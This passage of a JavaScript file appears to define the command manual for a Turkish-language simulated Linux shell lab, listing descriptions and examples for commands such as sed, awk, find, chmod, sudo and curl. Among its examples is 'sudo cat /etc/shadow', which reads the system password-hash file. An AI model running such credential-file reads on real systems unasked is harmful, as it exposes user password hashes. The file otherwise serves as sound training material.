  sed: { d: 'Akis editoru. Bul ve degistir icin klasik arac', u: ["sed 's/eski/yeni/g' dosya", "sed -i 's/a/b/' dosya yerinde degistirir", "sed -n '2,4p' dosya", "sed '/desen/d'"], e: ["sed 's/TODO/YAPILACAK/g' notes.txt", "sudo sed -i 's/80q/80/' /etc/nginx/nginx.conf"] },
  awk: { d: 'Satir ve sutun bazli metin isleme dili', u: ["awk '{print $1}'", "awk -F: '{print $1,$7}'", "awk '/desen/ {print $2}'", "awk '{s+=$2} END {print s}'"], e: ["awk '{print $1}' /var/log/nginx/access.log", "awk -F, 'NR>1 {print $1}' cities.csv"] },
  find: { d: 'Dosya sistemi icinde arama yapar', u: ['find yol [-name desen] [-type f|d] [-user ad] [-perm 777] [-empty]'], e: ['find / -name "*.sh"', 'find /tmp -type f', 'find ~ -name "*.txt"'] },
  tree: { d: 'Dizin agacini gosterir', u: ['tree [-a] [dizin]'], e: ['tree ~/projects'] },
  chmod: { d: 'Dosya izinlerini degistirir', u: ['chmod 755 dosya', 'chmod +x dosya', 'chmod u+rw,go-rwx dosya', 'r=4 w=2 x=1, sira sahip grup diger'], e: ['chmod +x script.sh', 'chmod 600 gizli.txt'] },
  chown: { d: 'Dosya sahibini degistirir, root gerekir', u: ['sudo chown kullanici[:grup] dosya'], e: ['sudo chown burak:burak dosya'] },
  sudo: { d: 'Komutu root yetkisiyle calistirir', u: ['sudo komut'], e: ['sudo cat /etc/shadow', 'sudo systemctl restart nginx'] },
  whoami: { d: 'Aktif kullanici adini yazdirir', u: ['whoami'], e: ['whoami', 'sudo whoami'] },
  id: { d: 'Kullanici ve grup kimliklerini gosterir', u: ['id'], e: ['id'] },
  ps: { d: 'Calisan surecleri listeler', u: ['ps', 'ps aux tum surecler'], e: ['ps aux', 'ps aux | grep python'] },
  top: { d: 'Surecleri kaynak kullanimina gore canli gosterir', u: ['top'], e: ['top'] },
  kill: { d: 'Surece sinyal gonderir, varsayilan SIGTERM', u: ['kill PID', 'kill -9 PID zorla oldurur'], e: ['kill 1024', 'sudo kill -9 1337'] },
  pkill: { d: 'Ada gore surec oldurur', u: ['pkill isim'], e: ['sudo pkill cryptominer'] },
  systemctl: { d: 'systemd servislerini yonetir', u: ['systemctl status|start|stop|restart|enable servis', 'systemctl --failed'], e: ['systemctl status nginx', 'sudo systemctl restart nginx'] },
  journalctl: { d: 'systemd loglarini okur', u: ['journalctl -u servis'], e: ['journalctl -u nginx', 'journalctl -u sshd'] },
  ip: { d: 'Ag arayuzleri, adres ve rotalari yonetir', u: ['ip addr', 'ip route', 'ip link', 'ip neigh'], e: ['ip a', 'ip r'] },
  ping: { d: 'ICMP echo ile erisilebilirlik testi', u: ['ping [-c sayi] hedef'], e: ['ping -c 3 8.8.8.8'] },
  traceroute: { d: 'Hedefe giden hop listesini gosterir', u: ['traceroute hedef'], e: ['traceroute 1.1.1.1'] },
  ss: { d: 'Soket istatistikleri, dinleyen portlar', u: ['ss -tulpn'], e: ['ss -tlnp', 'ss -tulpn | grep 2222'] },
  curl: { d: 'URL ile veri transferi, HTTP testleri', u: ['curl [-I] url', '-I sadece header'], e: ['curl http://localhost', 'curl -I http://localhost'] },
  dig: { d: 'DNS sorgusu', u: ['dig alan_adi [+short]'], e: ['dig google.com +short'] },
  getent: { d: 'NSS veritabanlarini sorgular, /etc/hosts dahil', u: ['getent hosts isim'], e: ['getent hosts intranet.local'] },
  tee: { d: 'stdin\'i hem ekrana hem dosyaya yazar', u: ['komut | tee [-a] dosya'], e: ['echo "10.0.0.5 srv" | sudo tee -a /etc/hosts'] },
  nano: { d: 'Basit metin editoru', u: ['nano dosya'], e: ['nano notlar.txt'] },
  history: { d: 'Komut gecmisini gosterir', u: ['history'], e: ['history | grep ssh'] },
  alias: { d: 'Komut kisayolu tanimlar', u: ["alias isim='komut'"], e: ["alias gs='git status'", 'alias'] },
  export: { d: 'Ortam degiskenini alt sureclere aktarir', u: ['export AD=deger'], e: ['export EDITOR=vim'] },
  env: { d: 'Ortam degiskenlerini listeler', u: ['env'], e: ['env | grep PATH'] },
  df: { d: 'Disk doluluk durumu', u: ['df -h'], e: ['df -h'] },
  du: { d: 'Dizin veya dosyanin disk kullanimi', u: ['du -sh yol'], e: ['du -sh /var/log'] },
  free: { d: 'Bellek kullanimi', u: ['free -h'], e: ['free -h'] },
  uname: { d: 'Sistem bilgisi', u: ['uname [-a] [-r]'], e: ['uname -a'] },
  xargs: { d: 'stdin\'den gelenleri komuta arguman yapar', u: ['komut | xargs komut2'], e: ['find /tmp -name "*.log" | xargs rm'] },
  submit: { d: 'Lab ozel, dedektif gorevlerinde cevap gonderir', u: ['submit cevap'], e: ['submit 203.0.113.45'] },
};

if (typeof module !== 'undefined') module.exports = { Shell, LOGS, HOME, USER, lines, COMMANDS, MANUAL };
